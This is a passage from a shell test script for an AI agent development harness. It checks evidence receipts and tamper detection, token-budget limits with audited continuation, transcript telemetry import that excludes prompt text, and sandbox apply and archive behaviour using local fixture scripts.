  '{"taskId":"T001","owner":"fixture-agent","expiresAt":"2999-01-01T00:00:00.000Z"}' \
  > .foundation/leases/tasks/unavailable-provider-recovery/T001.json
configuration_readiness="$(node .claude/harness/foundation.mjs proof-readiness \
  unavailable-provider-recovery 2>/dev/null || true)"
assert_contains "active lease returns active-work status" \
  "$configuration_readiness" '"status": "BLOCKED_BY_ACTIVE_WORK"'
assert_contains "active work is not model-budget eligible" \
  "$configuration_readiness" '"class": "active-work"'
assert_contains "active work recovery tells the host to wait or release" \
  "$configuration_readiness" '"kind": "wait-for-active-work"'
assert_contains "active work recovery preserves lease identity" \
  "$configuration_readiness" '"taskId": "T001"'

assert_cmd_zero "atomic proof run reuses valid receipts and audits" \
  node .claude/harness/foundation.mjs proof-run executable-evidence
assert_eq "receipt cache avoids a second command" "1" "$(tr -d '\n' < .foundation/provider-count.txt)"
printf 'unrelated-to-provider\n' > app.txt
scoped_plan="$(node .claude/harness/foundation.mjs proof-plan executable-evidence)"
assert_contains "declared provider inputs survive unrelated workspace edits" \
  "$scoped_plan" "reusable-inputs"
assert_cmd_zero "scoped receipts rebind without rerunning providers" \
  node .claude/harness/foundation.mjs proof-run executable-evidence
assert_eq "scoped reuse avoids another command" "1" "$(tr -d '\n' < .foundation/provider-count.txt)"
test_command_id="$(jq -r '.commandExecutionId' \
  .foundation/receipts/executable-evidence/test.json)"
static_command_id="$(jq -r '.commandExecutionId' \
  .foundation/receipts/executable-evidence/static-analysis.json)"
assert_eq "deduplicated receipts share command execution identity" \
  "$test_command_id" "$static_command_id"
durable_log="$(jq -r '.artifacts[] | select(.type == "command-log") | .path' \
  .foundation/receipts/executable-evidence/test.json)"
assert_contains "provider artifacts are copied into durable evidence vault" \
  "$durable_log" ".foundation/evidence/executable-evidence/"
cp "$durable_log" "$TMP/durable-log"
printf 'tampered\n' > "$durable_log"
if node .claude/harness/foundation.mjs proof-audit executable-evidence >/dev/null 2>&1; then
  fail "artifact digest tampering invalidates durable proof"
else
  pass "artifact digest tampering invalidates durable proof"
fi
cp "$TMP/durable-log" "$durable_log"
assert_cmd_zero "restored durable evidence audits successfully" \
  node .claude/harness/foundation.mjs proof-audit executable-evidence
sed -i.bak 's/"minimum":4/"minimum":5/' \
  openspec/changes/executable-evidence/evidence.yaml
rm openspec/changes/executable-evidence/evidence.yaml.bak
plan="$(node .claude/harness/foundation.mjs proof-plan executable-evidence)"
assert_contains "adapter policy change invalidates receipt fingerprint" \
  "$plan" "provider-fingerprint-stale"
sed -i.bak 's/"minimum":5/"minimum":4/' \
  openspec/changes/executable-evidence/evidence.yaml
rm openspec/changes/executable-evidence/evidence.yaml.bak
assert_cmd_zero "execution upgrade separates adapter wiring from claims" \
  node .claude/harness/foundation.mjs evidence-upgrade executable-evidence
assert_eq "behavioral contract no longer carries provider commands" "false" \
  "$(jq 'has("providers")' openspec/changes/executable-evidence/evidence.yaml)"
assert_eq "execution file receives migrated provider commands" "test-discovery" \
  "$(jq -r '.providers.test.adapter' openspec/changes/executable-evidence/execution.yaml)"

# Discovery accepts only an actual non-negative integer. JavaScript-coercible
# values are unknown evidence, while a numeric zero is a real empty suite.
node .claude/harness/foundation.mjs new 'Numeric report semantics' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve numeric-report-semantics \
  --impact low --coupling isolated >/dev/null
printf '%s\n' '#!/usr/bin/env sh' 'cat numeric-report.json' > numeric-report.sh
chmod +x numeric-report.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "test": {"adapter":"test-discovery","command":["sh","numeric-report.sh"],"minimum":1}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"numeric-report-outcome","scenario":"Test discovery is measurable","impact":"low","capabilities":["test"]}' \
  '  ]' \
  '}' > openspec/changes/numeric-report-semantics/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' \
  openspec/changes/numeric-report-semantics/tasks.md
rm openspec/changes/numeric-report-semantics/tasks.md.bak
for fixture in null array false empty string-number; do
  case "$fixture" in
    null) value='null' ;;
    array) value='[]' ;;
    false) value='false' ;;
    empty) value='""' ;;
    string-number) value='"29"' ;;
  esac
  printf '{"totalTests":%s}\n' "$value" > numeric-report.json
  if node .claude/harness/foundation.mjs proof-execute \
    numeric-report-semantics >/dev/null 2>&1; then
    fail "non-numeric discovery fixture '$fixture' cannot prove"
  else
    pass "non-numeric discovery fixture '$fixture' cannot prove"
  fi
  assert_eq "non-numeric discovery fixture '$fixture' is inconclusive" \
    "inconclusive" \
    "$(jq -r '.status' .foundation/receipts/numeric-report-semantics/discovery.json)"
done
printf '{"totalTests":0}\n' > numeric-report.json
if node .claude/harness/foundation.mjs proof-execute \
  numeric-report-semantics >/dev/null 2>&1; then
  fail "numeric zero cannot satisfy discovery minimum"
else
  pass "numeric zero cannot satisfy discovery minimum"
fi
assert_eq "numeric zero is a measured failure" "fail" \
  "$(jq -r '.status' .foundation/receipts/numeric-report-semantics/discovery.json)"
printf '{"totalTests":29}\n' > numeric-report.json
assert_cmd_zero "positive integer discovery can prove" \
  node .claude/harness/foundation.mjs proof-execute numeric-report-semantics
printf '{"stats":{"tests":7}}\n' > numeric-report.json
assert_cmd_zero "known Mocha stats discovery can prove" \
  node .claude/harness/foundation.mjs proof-execute numeric-report-semantics
assert_eq "Mocha stats exposes the discovered count" "7" \
  "$(jq -r '.discovery.discovered' .foundation/receipts/numeric-report-semantics/discovery.json)"

node .claude/harness/foundation.mjs new 'Parallel evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve parallel-evidence \
  --impact low --coupling isolated >/dev/null
printf '%s\n' '#!/usr/bin/env sh' \
  'touch ".foundation/parallel-$1"' \
  'tries=0' \
  'while [ ! -f ".foundation/parallel-$2" ] && [ "$tries" -lt 50 ]; do' \
  '  sleep 0.02' \
  '  tries=$((tries + 1))' \
  'done' \
  '[ -f ".foundation/parallel-$2" ]' > parallel-provider.sh
chmod +x parallel-provider.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "static-analysis": {"adapter":"command","command":["sh","parallel-provider.sh","static","security"]},' \
  '    "security-static": {"adapter":"command","command":["sh","parallel-provider.sh","security","static"]}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"parallel-outcome","scenario":"Independent checks converge","impact":"low","capabilities":["static-analysis","security-static"]}' \
  '  ]' \
  '}' > openspec/changes/parallel-evidence/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/parallel-evidence/tasks.md
rm openspec/changes/parallel-evidence/tasks.md.bak
assert_cmd_zero "independent providers execute concurrently" \
  node .claude/harness/foundation.mjs proof-execute parallel-evidence

node .claude/harness/foundation.mjs new 'Locked evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve locked-evidence \
  --impact low --coupling isolated >/dev/null
printf '%s\n' '#!/usr/bin/env sh' \
  'if [ "$1" = "mutation" ]; then' \
  '  touch .foundation/mutation-active' \
  '  sleep 0.1' \
  '  rm .foundation/mutation-active' \
  '  touch .foundation/mutation-done' \
  '  exit 0' \
  'fi' \
  '[ ! -f .foundation/mutation-active ] && [ -f .foundation/mutation-done ]' \
  > lock-provider.sh
chmod +x lock-provider.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "mutation": {"adapter":"command","command":["sh","lock-provider.sh","mutation"],"classification":"behavioral-kill"},' \
  '    "static-analysis": {"adapter":"command","command":["sh","lock-provider.sh","static"]}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"locked-outcome","scenario":"Mutation never overlaps workspace readers","impact":"low","capabilities":["mutation","static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/locked-evidence/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/locked-evidence/tasks.md
rm openspec/changes/locked-evidence/tasks.md.bak
assert_cmd_zero "workspace-write resource serializes mutation" \
  node .claude/harness/foundation.mjs proof-execute locked-evidence
mutation_command_id="$(jq -r '.commandExecutionId' \
  .foundation/receipts/locked-evidence/mutation.json)"
static_command_id="$(jq -r '.commandExecutionId' \
  .foundation/receipts/locked-evidence/static-analysis.json)"
if [ "$mutation_command_id" = "$static_command_id" ]; then
  fail "separate provider commands receive distinct execution identities"
else
  pass "separate provider commands receive distinct execution identities"
fi

# A harness-owned service requires application identity and is shared with the
# provider without leaving a process behind.
node .claude/harness/foundation.mjs new 'Service evidence' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve service-evidence \
  --impact low --coupling isolated >/dev/null
printf '%s\n' \
  '{' \
  '  "version": 1,' \
  '  "providers": {' \
  '    "static-analysis": {"adapter":"command","command":["sh","-c","exit 0"],"service":"web"}' \
  '  },' \
  '  "services": {' \
  '    "web": {' \
  '      "command":["node","-e","setInterval(() => {}, 1000)"],' \
  '      "readiness": {' \
  '        "url":"data:text/plain,service-ready",' \
  '        "expectBody":"service-ready"' \
  '      }' \
  '    }' \
  '  }' \
  '}' > openspec/changes/service-evidence/execution.yaml
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "claims": [' \
  '    {"id":"service-outcome","scenario":"The intended service is ready","impact":"low","capabilities":["static-analysis"]}' \
  '  ]' \
  '}' > openspec/changes/service-evidence/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/service-evidence/tasks.md
rm openspec/changes/service-evidence/tasks.md.bak
if node .claude/harness/foundation.mjs proof-execute service-evidence \
  > "$TMP/service-output.txt" 2>&1; then
  pass "harness-owned identity service supports provider proof"
else
  fail "harness-owned identity service supports provider proof"
  sed -n '1,120p' "$TMP/service-output.txt" >&2
fi
assert_file_contains "service log is bound into proof manifest" \
  .foundation/receipts/service-evidence/proof.json '"type": "service-log"'

# The Playwright adapter requires structured claim annotations. A deterministic
# fake reporter pins parsing without downloading browser binaries in unit CI.
node .claude/harness/foundation.mjs new 'Browser adapter' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve browser-adapter \
  --impact low --coupling isolated >/dev/null
printf '%s\n' '#!/usr/bin/env sh' \
  'printf "%s\\n" "{\"suites\":[{\"specs\":[{\"tests\":[{\"annotations\":[{\"type\":\"claim\",\"description\":\"browser-outcome\"}],\"results\":[{\"status\":\"passed\"}]}]}]}]}"' \
  > fake-playwright.sh
chmod +x fake-playwright.sh
printf '%s\n' \
  '{' \
  '  "version": 2,' \
  '  "providers": {' \
  '    "browser": {"adapter":"playwright","command":["sh","fake-playwright.sh"],"project":"chromium","inputMode":"browser-automation"}' \
  '  },' \
  '  "claims": [' \
  '    {"id":"browser-outcome","scenario":"Rendered behavior passes","impact":"low","capabilities":["browser"]}' \
  '  ]' \
  '}' > openspec/changes/browser-adapter/evidence.yaml
sed -i.bak 's/- \[ \]/- [x]/g' openspec/changes/browser-adapter/tasks.md
rm openspec/changes/browser-adapter/tasks.md.bak
node .claude/harness/foundation.mjs doctor --stage change \
  --change browser-adapter > "$TMP/change-doctor.txt" 2>&1 || true
assert_file_contains "change-stage doctor treats future project dependencies as planned" \
  "$TMP/change-doctor.txt" "playwright:package: install and lock @playwright/test"
if node .claude/harness/foundation.mjs doctor \
  --change browser-adapter > "$TMP/browser-doctor.txt" 2>&1; then
  fail "doctor catches missing project-owned Playwright dependency"
else
  pass "doctor catches missing project-owned Playwright dependency"
fi
assert_file_contains "doctor gives Playwright dependency action" \
  "$TMP/browser-doctor.txt" "install and lock @playwright/test"
printf '%s\n' '{"devDependencies":{"@playwright/test":"1.0.0"}}' > package.json
mkdir -p node_modules/.bin
cp fake-playwright.sh node_modules/.bin/playwright
chmod +x node_modules/.bin/playwright
assert_cmd_zero "Playwright adapter maps annotated claims" \
  node .claude/harness/foundation.mjs proof-execute browser-adapter
assert_file_contains "browser receipt records automation input mode" \
  .foundation/receipts/browser-adapter/browser.json '"inputMode": "browser-automation"'
sed -i.bak 's/browser-outcome/browser-missing-annotation/g' \
  openspec/changes/browser-adapter/evidence.yaml
rm openspec/changes/browser-adapter/evidence.yaml.bak
if node .claude/harness/foundation.mjs proof-execute browser-adapter >/dev/null 2>&1; then
  fail "Playwright adapter rejects missing claim annotations"
else
  pass "Playwright adapter rejects missing claim annotations"
fi
assert_file_contains "missing browser claim is inconclusive, not guessed pass" \
  .foundation/receipts/browser-adapter/browser.json '"status": "inconclusive"'

output="$(node .claude/harness/foundation.mjs new 'Tiny copy edit' --rapid)"
assert_contains "creates rapid change" "$output" "foundation-rapid"
node .claude/harness/foundation.mjs resolve tiny-copy-edit --impact low --coupling isolated --security auth >/dev/null
schema="$(jq -r '.schema' .foundation/runtime/tiny-copy-edit.json 2>/dev/null || true)"
assert_eq "semantic security upgrades rapid lane" "foundation-standard" "$schema"
sed -i.bak \
  's/"capabilities": \["test"\]/"capabilities": ["browser", "mutation"]/' \
  openspec/changes/tiny-copy-edit/evidence.yaml
rm openspec/changes/tiny-copy-edit/evidence.yaml.bak

if node .claude/harness/foundation.mjs receipt tiny-copy-edit browser pass \
  --foreground-required yes --foreground-available no --input-mode os-input \
  --observed "fixture browser evidence" --source harness-test --artifact app.txt >/dev/null 2>&1; then
  fail "browser foreground mismatch cannot pass"
else
  pass "browser foreground mismatch cannot pass"
fi

if node .claude/harness/foundation.mjs receipt tiny-copy-edit mutation pass \
  --classification crash --observed "fixture mutation evidence" \
  --source harness-test --artifact app.txt >/dev/null 2>&1; then
  fail "mutation crash cannot pass"
else
  pass "mutation crash cannot pass"
fi

event="$(node .claude/harness/foundation.mjs event tiny-copy-edit --request req-1 --operation build)"
assert_contains "watchdog records request" "$event" "BUDGET tiny-copy-edit"
assert_file_exists "event ledger created" ".foundation/logs/tiny-copy-edit/events.jsonl"
node .claude/harness/foundation.mjs event tiny-copy-edit --request req-2 \
  --operation build --model sonnet --repo root --task T001 \
  --input 10 --output 2 >/dev/null
if node .claude/harness/foundation.mjs event tiny-copy-edit \
  --request req-1 --operation build >/dev/null 2>&1; then
  fail "watchdog rejects duplicate request identity"
else
  pass "watchdog rejects duplicate request identity"
fi
printf '%s\n' \
  '{"request_id":"host-1","model":"codex","usage":{"input_tokens":120,"output_tokens":30,"cache_read_input_tokens":20}}' \
  > "$TMP/codex-events.jsonl"
telemetry="$(node .claude/harness/foundation.mjs telemetry-import tiny-copy-edit \
  "$TMP/codex-events.jsonl" --format codex)"
assert_contains "host telemetry adapter imports authoritative usage" \
  "$telemetry" "imported 1"
metrics="$(node .claude/harness/foundation.mjs metrics tiny-copy-edit)"
assert_contains "metrics distinguish host telemetry from operations-only data" \
  "$metrics" '"measurement": "host-events-only"'
assert_contains "host telemetry contributes input tokens" \
  "$metrics" '"inputTokens": 130'
assert_contains "metrics attribute usage by model" \
  "$metrics" '"sonnet":'
assert_contains "metrics attribute usage by repository" \
  "$metrics" '"root":'
assert_eq "watchdog accumulates known request tokens" "182" \
  "$(jq -r '.budget.usedTokens' .foundation/runtime/tiny-copy-edit.json)"
tmp_runtime="$TMP/tiny-copy-budget.json"
jq '.budget.window.targetTokens = 182' .foundation/runtime/tiny-copy-edit.json > "$tmp_runtime"
cp "$tmp_runtime" .foundation/runtime/tiny-copy-edit.json
budget_event="$(node .claude/harness/foundation.mjs event tiny-copy-edit \
  --request req-token-limit --operation build)"
assert_contains "token budget enters completion-only without failing accounting" \
  "$budget_event" "COMPLETION_ONLY"
assert_file_contains "over-budget request remains auditable" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" '"requestId":"req-token-limit"'
budget_status="$(node .claude/harness/foundation.mjs metrics tiny-copy-edit)"
assert_contains "metrics exposes completion-only mode" \
  "$budget_status" '"mode": "completion-only"'
if budget_continue_output="$(node .claude/harness/foundation.mjs budget-continue \
  tiny-copy-edit --reason "finish required proof" --run tiny-copy-edit \
  --decision-ref fixture://user/continue-required-work 2>&1)"; then
  pass "operator can open an audited continuation window"
else
  fail "operator can open an audited continuation window — $budget_continue_output"
fi
assert_file_contains "budget continuation is audited" \
  ".foundation/logs/tiny-copy-edit/budget-events.jsonl" '"action":"continue"'
assert_eq "continuation preserves lifetime usage" "4" \
  "$(jq -r '.budget.lifetime.usedRequests' .foundation/runtime/tiny-copy-edit.json)"
assert_eq "continuation resets only the active window" "0" \
  "$(jq -r '.budget.window.usedRequests' .foundation/runtime/tiny-copy-edit.json)"
tmp_runtime="$TMP/tiny-copy-budget-second.json"
jq '.budget.window.targetTokens = 1' .foundation/runtime/tiny-copy-edit.json > "$tmp_runtime"
cp "$tmp_runtime" .foundation/runtime/tiny-copy-edit.json
node .claude/harness/foundation.mjs event tiny-copy-edit \
  --request req-second-limit --operation build --input 2 >/dev/null
if node .claude/harness/foundation.mjs budget-continue tiny-copy-edit \
  --reason "second required attempt" --run tiny-copy-edit \
  --decision-ref fixture://user/continue-second-attempt >/dev/null 2>&1; then
  fail "active run cannot extend its budget twice"
else
  pass "active run cannot extend its budget twice"
fi

# Claude usage belongs to assistant requests in the session transcript, not to
# PostToolUse. Native import reads the nested schema, imports subagents once,
# keeps cache classes separate, and never copies prompt text.
CLAUDE_TRANSCRIPT="$TMP/claude-native.jsonl"
mkdir -p "$TMP/claude-native/subagents"
printf '%s\n' \
  '{"type":"user","message":{"role":"user","content":"DO-NOT-COPY-PRIVATE-PROMPT"}}' \
  '{"type":"assistant","requestId":"claude-main-1","sessionId":"claude-native","timestamp":"2026-07-30T00:00:00.000Z","message":{"id":"msg-main-1","role":"assistant","model":"claude-test","usage":{"input_tokens":100,"output_tokens":25,"cache_creation_input_tokens":40,"cache_read_input_tokens":60}}}' \
  > "$CLAUDE_TRANSCRIPT"
printf '%s\n' \
  '{"type":"assistant","agentId":"worker-1","sessionId":"claude-native","timestamp":"2026-07-30T00:00:01.000Z","message":{"id":"msg-worker-1","role":"assistant","model":"claude-test","usage":{"input_tokens":20,"output_tokens":5,"cache_creation_input_tokens":2,"cache_read_input_tokens":3}}}' \
  > "$TMP/claude-native/subagents/agent-worker-1.jsonl"
claude_sync="$(node .claude/harness/foundation.mjs telemetry-sync tiny-copy-edit \
  "$CLAUDE_TRANSCRIPT")"
assert_contains "native Claude transcript sync imports main and subagent requests" \
  "$claude_sync" "imported 2"
assert_file_not_contains "telemetry never copies prompt content" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" "DO-NOT-COPY-PRIVATE-PROMPT"
assert_file_contains "Claude cache creation tokens remain distinct" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" '"cacheCreationTokens":40'
assert_file_contains "Claude cache read tokens remain distinct" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" '"cacheReadTokens":60'
claude_sync="$(node .claude/harness/foundation.mjs telemetry-sync tiny-copy-edit \
  "$CLAUDE_TRANSCRIPT")"
assert_contains "incremental Claude sync does not recount requests" \
  "$claude_sync" "imported 0"

# An automatically bound session begins at the current byte offset, so earlier
# unrelated conversation is not attributed to the change. Later checkpoints
# consume only new request records under the phase established by packet.
BOUND_TRANSCRIPT="$TMP/bound-session.jsonl"
printf '%s\n' \
  '{"type":"assistant","requestId":"before-change","message":{"id":"before","role":"assistant","model":"claude-test","usage":{"input_tokens":999,"output_tokens":999}}}' \
  > "$BOUND_TRANSCRIPT"
FOUNDATION_CLAUDE_SESSION_ID=bound-session \
FOUNDATION_CLAUDE_TRANSCRIPT_PATH="$BOUND_TRANSCRIPT" \
  node .claude/harness/foundation.mjs sandbox create tiny-copy-edit >/dev/null
FOUNDATION_CLAUDE_SESSION_ID=bound-session \
FOUNDATION_CLAUDE_TRANSCRIPT_PATH="$BOUND_TRANSCRIPT" \
  node .claude/harness/foundation.mjs packet tiny-copy-edit --phase build >/dev/null
printf '%s\n' \
  '{"type":"assistant","requestId":"during-build","message":{"id":"during","role":"assistant","model":"claude-test","usage":{"input_tokens":11,"output_tokens":7}}}' \
  >> "$BOUND_TRANSCRIPT"
FOUNDATION_CLAUDE_SESSION_ID=bound-session \
FOUNDATION_CLAUDE_TRANSCRIPT_PATH="$BOUND_TRANSCRIPT" \
  node .claude/harness/foundation.mjs metrics tiny-copy-edit >/dev/null
assert_file_not_contains "session binding excludes pre-change transcript history" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" '"requestId":"before-change"'
assert_file_contains "checkpoint sync attributes new requests to the active phase" \
  ".foundation/logs/tiny-copy-edit/events.jsonl" \
  '"operationId":"build","agentId":"orchestrator","modelId":"claude-test","requestId":"during-build"'
assert_eq "new host session opens a fresh budget window" "bound-session" \
  "$(jq -r '.budget.window.id' .foundation/runtime/tiny-copy-edit.json)"
assert_eq "session rollover preserves lifetime but resets run usage" "1" \
  "$(jq -r '.budget.window.usedRequests' .foundation/runtime/tiny-copy-edit.json)"

# Crossing a model budget must stop further exploration, not lock deterministic
# lifecycle commands. Telemetry is ingested and warns while the requested
# packet/readiness/proof command remains resumable and can reuse prior evidence.
tmp_runtime="$TMP/tiny-copy-resume-budget.json"
jq '.budget.window.targetTokens = 1' .foundation/runtime/tiny-copy-edit.json > "$tmp_runtime"
cp "$tmp_runtime" .foundation/runtime/tiny-copy-edit.json
printf '%s\n' \
  '{"type":"assistant","requestId":"over-budget-before-prove","message":{"id":"over-budget","role":"assistant","model":"claude-test","usage":{"input_tokens":11,"output_tokens":7}}}' \
  >> "$BOUND_TRANSCRIPT"
resume_packet="$(FOUNDATION_CLAUDE_SESSION_ID=bound-session \
  FOUNDATION_CLAUDE_TRANSCRIPT_PATH="$BOUND_TRANSCRIPT" \
  node .claude/harness/foundation.mjs packet tiny-copy-edit --phase prove \
  2>"$TMP/over-budget-resume.err")"
assert_contains "over-budget telemetry does not block lifecycle resume" \
  "$resume_packet" '"packetType":"global"'
assert_contains "over-budget packet declares completion-only policy" \
  "$resume_packet" '"mode":"completion-only"'
assert_contains "completion-only packet forbids scope expansion" \
  "$resume_packet" '"scope-expansion"'
assert_file_contains "over-budget lifecycle resume still emits stop warning" \
  "$TMP/over-budget-resume.err" "STOP_AND_RESCOPE"
jq '.budget.window.targetTokens = 800000' .foundation/runtime/tiny-copy-edit.json > "$tmp_runtime"
cp "$tmp_runtime" .foundation/runtime/tiny-copy-edit.json

# Non-Git repositories use a manifest-guarded isolated copy.
node .claude/harness/foundation.mjs new 'Copy sandbox' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve copy-sandbox --impact low --coupling isolated >/dev/null
copy_output="$(node .claude/harness/foundation.mjs sandbox create copy-sandbox)"
assert_contains "non-git sandbox uses isolated copy" "$copy_output" "mode: isolated-copy"
assert_eq "copy sandbox enters Build" "building" \
  "$(jq -r '.status' .foundation/runtime/copy-sandbox.json)"
copy_path="$(jq -r '.workspace.path' .foundation/runtime/copy-sandbox.json)"
printf 'copy-applied\n' > "$copy_path/app.txt"
ln -s app.txt "$copy_path/current-link"
printf '%s\n' '{"lockfileVersion":3}' > "$copy_path/package-lock.json"
sed -i.bak 's/- \[ \]/- [x]/g' "$copy_path/openspec/changes/copy-sandbox/tasks.md"
rm "$copy_path/openspec/changes/copy-sandbox/tasks.md.bak"
copy_plan="$(node .claude/harness/foundation.mjs proof-plan copy-sandbox)"
assert_contains "changed lockfile escalates supply-chain evidence by policy" \
  "$copy_plan" "dependency-supply-chain: missing"
node .claude/harness/foundation.mjs receipt copy-sandbox test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt copy-sandbox discovery pass \
  --discovered 1 --minimum 1 --observed "1 test discovered" \
  --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt copy-sandbox dependency-supply-chain pass \
  --observed "lockfile inspected" --source harness-test --artifact package-lock.json >/dev/null
node .claude/harness/foundation.mjs prove copy-sandbox >/dev/null

mkdir -p "$TMP/bin"
cp /dev/null "$TMP/bin/openspec"
chmod +x "$TMP/bin/openspec"
printf '%s\n' '#!/usr/bin/env sh' \
  'if [ "${1:-}" = "--version" ]; then echo "1.7.0"; exit 0; fi' \
  'if [ "${1:-}" = "archive" ]; then' \
  '  if [ "${FOUNDATION_TEST_OPEN_SPEC_FAIL:-0}" = "1" ]; then echo "injected archive failure" >&2; exit 1; fi' \
  '  mkdir -p "openspec/changes/archive"' \
  '  mv "openspec/changes/$2" "openspec/changes/archive/$2"' \
  '  echo "archived $2"' \
  '  exit 0' \
  'fi' > "$TMP/bin/openspec"
chmod +x "$TMP/bin/openspec"
printf 'user-owned and unrelated\n' > NOTES.md
if PATH="$TMP/bin:$PATH" FOUNDATION_TEST_OPEN_SPEC_FAIL=1 \
  node .claude/harness/foundation.mjs archive copy-sandbox >/dev/null 2>&1; then
  fail "archive failure is surfaced after code apply"
else
  pass "archive failure is surfaced after code apply"
fi
assert_eq "failed archive retains recoverable applied state" "applied" \
  "$(jq -r '.status' .foundation/runtime/copy-sandbox.json)"
assert_eq "code remains applied for archive retry" "copy-applied" \
  "$(tr -d '\n' < app.txt)"
assert_eq "copy apply preserves a new symlink" "app.txt" "$(readlink current-link)"
assert_file_contains "unrelated target file survives apply" NOTES.md \
  "user-owned and unrelated"
archive_output="$(PATH="$TMP/bin:$PATH" node .claude/harness/foundation.mjs archive copy-sandbox)"
assert_contains "archive delegates once to pinned OpenSpec" "$archive_output" "ARCHIVED copy-sandbox"
copy_applied="$(tr -d '\n' < app.txt)"
assert_eq "non-git target matches isolated copy" "copy-applied" "$copy_applied"
assert_file_absent "archive cleans the applied temporary copy" "$copy_path"
archive_again="$(node .claude/harness/foundation.mjs archive copy-sandbox)"
assert_contains "archive is idempotent after spec sync" "$archive_again" "ALREADY ARCHIVED copy-sandbox"

# A separate clean Git fixture exercises the complete worktree proof/apply path.
mkdir -p "$TMP/git-project/.claude/harness" "$TMP/git-project/openspec" "$TMP/git-project/.foundation"
cp "$ROOT/.claude/harness/foundation.mjs" "$TMP/git-project/.claude/harness/"
cp -R "$ROOT/.claude/harness/runtime" "$TMP/git-project/.claude/harness/"
cp "$ROOT/.claude/harness/commands.json" "$TMP/git-project/.claude/harness/"
cp -R "$ROOT/openspec/schemas" "$TMP/git-project/openspec/"
cp "$ROOT/openspec/config.yaml" "$TMP/git-project/openspec/"
cp "$ROOT/.foundation/.gitignore" "$TMP/git-project/.foundation/"
printf 'before\n' > "$TMP/git-project/app.txt"
printf 'first\n' > "$TMP/git-project/target-a.txt"
printf 'second\n' > "$TMP/git-project/target-b.txt"
ln -s target-a.txt "$TMP/git-project/current-link"
cd "$TMP/git-project"
git init -q
git config user.name "Foundation Test"
git config user.email "foundation@example.invalid"
git add .
git commit -qm "fixture"
node .claude/harness/foundation.mjs new 'Sandbox copy' --rapid >/dev/null
node .claude/harness/foundation.mjs resolve sandbox-copy --impact low --coupling isolated >/dev/null
node .claude/harness/foundation.mjs sandbox create sandbox-copy >/dev/null
assert_eq "Git sandbox enters Build" "building" \
  "$(jq -r '.status' .foundation/runtime/sandbox-copy.json)"
printf 'after\n' > .foundation/sandboxes/sandbox-copy/app.txt
rm .foundation/sandboxes/sandbox-copy/current-link
ln -s target-b.txt .foundation/sandboxes/sandbox-copy/current-link
sed -i.bak 's/- \[ \]/- [x]/g' .foundation/sandboxes/sandbox-copy/openspec/changes/sandbox-copy/tasks.md
rm .foundation/sandboxes/sandbox-copy/openspec/changes/sandbox-copy/tasks.md.bak
printf '\nRevised during build.\n' >> openspec/changes/sandbox-copy/proposal.md
sync_output="$(node .claude/harness/foundation.mjs sandbox sync sandbox-copy)"
assert_contains "active sandbox change syncs" "$sync_output" "SYNCED sandbox-copy"
assert_file_contains "sync carries revised proposal into sandbox" \
  .foundation/sandboxes/sandbox-copy/openspec/changes/sandbox-copy/proposal.md \
  "Revised during build."
assert_file_contains "sync preserves unchanged completed task" \
  .foundation/sandboxes/sandbox-copy/openspec/changes/sandbox-copy/tasks.md \
  "- [x]"
node .claude/harness/foundation.mjs receipt sandbox-copy test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt sandbox-copy discovery pass \
  --discovered 2 --minimum 1 --observed "2 tests discovered" \
  --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs prove sandbox-copy >/dev/null
rm .foundation/sandboxes/sandbox-copy/current-link
ln -s target-a.txt .foundation/sandboxes/sandbox-copy/current-link
if node .claude/harness/foundation.mjs land-check sandbox-copy >/dev/null 2>&1; then
  fail "dirty symlink target change invalidates proof"
else
  pass "dirty symlink target change invalidates proof"
fi
rm .foundation/sandboxes/sandbox-copy/current-link
ln -s target-b.txt .foundation/sandboxes/sandbox-copy/current-link
node .claude/harness/foundation.mjs receipt sandbox-copy test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt sandbox-copy discovery pass \
  --discovered 2 --minimum 1 --observed "2 tests discovered" \
  --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs prove sandbox-copy >/dev/null
printf '\nSecond revision after proof.\n' >> openspec/changes/sandbox-copy/proposal.md
node .claude/harness/foundation.mjs sandbox sync sandbox-copy >/dev/null
if node .claude/harness/foundation.mjs land-check sandbox-copy >/dev/null 2>&1; then
  fail "sandbox revision invalidates prior proof"
else
  pass "sandbox revision invalidates prior proof"
fi
node .claude/harness/foundation.mjs receipt sandbox-copy test pass \
  --observed "fixture test evidence" --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs receipt sandbox-copy discovery pass \
  --discovered 2 --minimum 1 --observed "2 tests discovered" \
  --source harness-test --artifact app.txt >/dev/null
node .claude/harness/foundation.mjs prove sandbox-copy >/dev/null
printf 'user-conflict\n' > app.txt
if node .claude/harness/foundation.mjs sandbox apply sandbox-copy >/dev/null 2>&1; then
  fail "touched-path conflict blocks before mutation"
else
  pass "touched-path conflict blocks before mutation"
fi
assert_eq "conflicting target content is preserved" "user-conflict" \
  "$(tr -d '\n' < app.txt)"
